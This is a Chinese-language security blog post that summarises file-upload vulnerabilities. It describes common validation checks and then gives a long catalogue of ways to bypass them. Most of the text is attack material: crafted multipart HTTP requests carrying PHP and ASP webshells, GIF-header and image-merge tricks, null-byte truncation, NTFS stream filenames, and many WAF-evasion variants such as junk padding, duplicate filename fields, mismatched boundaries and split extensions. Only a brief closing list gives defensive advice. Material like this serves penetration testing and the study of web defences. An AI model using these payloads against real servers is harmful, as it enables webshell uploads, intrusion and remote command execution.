---
layout: post
title:  文件上传漏洞总结
date:   2018-10-19 17:24:03 +0800
img:
description: 文件上传漏洞总结
categories: web安全
---


* 目录
{:toc}

## 0x00 前言

文件上传漏洞总结

## 0x01 文件上传校验姿势

- 客户端javascript校验（一般只校验后缀名）
- 服务端校验
    - 文件头content-type字段校验（image/gif）
    - 文件内容头校验（GIF89a）
    - 后缀名黑名单校验
    - 后缀名白名单校验
    - 自定义正则校验
- WAF设备校验（根据不同的WAF产品而定）

### 1.1 客户端校验

一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。

判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。

### 1.2 服务端校验

**1.2.1 content-type字段校验**

这里以PHP代码为例，模拟web服务器端的校验代码

```PHP
<?php
    if($_FILES['userfile']['type'] != "image/gif")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。
        {   
         echo "Sorry, we only allow uploading GIF images";
         exit;
         }
    $uploaddir = 'uploads/';
    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
    if (move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile))
        {
            echo "File is valid, and was successfully uploaded.\n";
        } else {
            echo "File uploading failed.\n";
        }
     ?>
```

可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。

**1.2.2 文件内容头校验**

可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：
-  .JPEG;.JPE;.JPG，”JPGGraphic File”
-  .gif，”GIF 89A”
-  .zip，”Zip Compressed”
-  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”


## 0x02 文件上传绕过校验姿势


- 客户端绕过（抓包改包）
- 服务端绕过
    - 文件类型
    - 文件头
    - 文件后缀名
- 配合文件包含漏洞绕过
- 配合服务器解析漏洞绕过
- CMS、编辑器漏洞绕过
- 配合操作系统文件命名规则绕过
- 配合其他规则绕过
- WAF绕过

### 2.1 客户端绕过

可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。

### 2.2 服务端绕过

**2.2.1 文件类型绕过**

我们可以通过抓包，将content-type字段改为image/gif

```
POST /upload.php HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: TE, close
Host: localhost
User-Agent: libwww-perl/5.803
Content-Type: multipart/form-data; boundary=xYzZY
Content-Length: 155
--xYzZY
Content-Disposition: form-data; name="userfile"; filename="shell.php"
Content-Type: image/gif (原为 Content-Type: text/plain)
<?php system($_GET['command']);?>
--xYzZY-
```

**2.2.2 文件头绕过**

在木马内容基础上再加了一些文件信息，有点像下面的结构

`GIF89a<?php phpinfo(); ?>`

或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾

`copy xx.jpg/b + yy.txt/a xy.jpg `

- /b 即二进制[binary]模式

- /a 即ascii模式 xx.jpg正常图片文件 

**2.2.3 文件后缀名绕过**

前提：黑名单校验

黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。

绕过方法：
- 找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类
- 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类

能被解析的文件扩展名列表：
- jsp jspx jspf
- asp asa cer aspx
- php php php3 php4
- exe exee

### 2.3 配合文件包含漏洞

前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。

绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）
- 先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
- 然后再上传一个.php的文件，内容为`<?php Include(“上传的txt文件路径”);?>`

此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：

```
#PHP    
<?php Include("上传的txt文件路径");?> 
#ASP    
<!--#include file="上传的txt文件路径" -->
#JSP    
<jsp:inclde page="上传的txt文件路径"/>
or  
<%@include file="上传的txt文件路径"%>
```

### 2.4 配合文件解析漏洞

### 2.5 配合操作系统文件命名规则

1. 上传不符合windows文件命名规则的文件名
    - test.asp.
    - test.asp(空格)
    - test.php:1.jpg
    - test.php::$DATA
    - shell.php::$DATA…….

    会被windows系统自动去掉不符合规则符号后面的内容。
2. linux下后缀名大小写

    在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。

### 2.6 CMS、编辑器漏洞

1. CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。
2. 编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。


### 2.7 配合其他规则

0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候
- test.php(0x00).jpg
- test.php%00.jpg
- 路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg

伪代码演示：
```PHP
name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)
type =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg
if(type == jpg)
   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断
//最后以 help.asp 存入路径里
```

### 2.8 WAF绕过

**2.8.1 垃圾数据**

有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；

可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。

也可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。

```PHP
POST /upload.php HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: TE, close
Host: localhost
User-Agent: libwww-perl/5.803
Content-Type: multipart/form-data; boundary=xYzZY
Content-Length: 155
/////////可以在这里添加a=11111111111....
--xYzZY
Content-Disposition: form-data; name="userfile"; filename="shell.php";/////////可以在这里添加a=11111111111....
Content-Type: image/gif
/////////可以在这里添加a=11111111111....
<?php system($_GET['command']);?>
--xYzZY-
```

**2.8.2 filename**

针对早期版本安全狗，可以多加一个filename

```PHP
--xYzZY
Content-Disposition: form-data; name="userfile"; filename="shell.jpg";filename="shell.php" //多加一个filename
Content-Type: image/gif
<?php system($_GET['command']);?>
--xYzZY-
```
或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：

```PHP
--xYzZY
Content-Disposition: form-data; name="userfile"
Content-Type: image/gif
filename="shell.php"  //把filemane放这里
<?php system($_GET['command']);?>
--xYzZY-
```

**2.8.3 POTS/GET**

有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。

此种情况可以上传一个POST型的数据包，抓包将POST改为GET。

**2.8.4 利用waf本身缺陷**

- 删除实体里面的Conten-Type字段

第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。

```PHP
正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png
构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
C.php"
```
- 删除Content-Disposition字段里的空格
```php
Content-Disposition:/*这里空格删除*/form-data; name="userfile"; filename="shell.php"
```

- 增加一个空格导致安全狗被绕过案列：

```
Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099
尝试在boundary后面加个空格或者其他可被正常处理的字符：
boundary= —————————47146314211411730218525550
```

- 修改Content-Disposition字段值的大小写
```
Content-Disposition: form-data; nAme="userfile"; filename="shell.php"
```
- Boundary边界不一致

每次文件上传时的Boundary边界都是一致的：

但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：

Win2k3 + IIS6.0 + ASP

```php
Content-Type: multipart/form-data; boundary=---------------------------471463142114117302185255dddd //修改
Content-Length: 253
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name="file1"; filename="shell.asp"
Content-Type: application/octet-stream
<%eval request("a")%>
-----------------------------4714631421141173021852555099--
```

- 文件名回车
```php
Content-Disposition: form-data; name="file1"; filename="shell.ph
p" //php中间回车
```

- 多个Content-Disposition

在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过

Win2k8 + IIS7.0 + PHP

```php
Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099 
Content-Length: 253
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name="file1"; filename="shell.php"
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name="file1"; filename="shell.jpg"
Content-Type: application/octet-stream
<%eval request("a")%>
-----------------------------4714631421141173021852555099--
```
- 利用NTFS ADS 特性

ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。

上传的文件名| 服务器表面现象| 生成的文件内容
--|--|--
Test.php:a.jpg|生成Test.php|空
Test.php::$DATA|生成test.php|\<?php phpinfo();?>
Test.php::$INDEX_ALLOCATION|生成test.php文件夹|
Test.php::$DATA.jpg|生成0.jgp|\<?php phpinfo();?>
Test.php::$DATA\aaa.jpg|生成aaa.jpg|\<?php phpinfo();?>

- 文件重命名绕过

如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。
```php
Content-Disposition: form-data; name="file1"; filename="shell...............................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
..............................................
............................................php"
```

- 特殊的长文件名绕过

文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：
```
shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg
```
**2.8.5** 其他绕过

如服务器解析漏洞、文件包含漏洞等尝试绕过


## 0x03 文件校验的几点建议


- 文件扩展名服务端白名单校验。
- 文件内容服务端校验。
- 上传文件重命名。
- 隐藏上传文件路径。
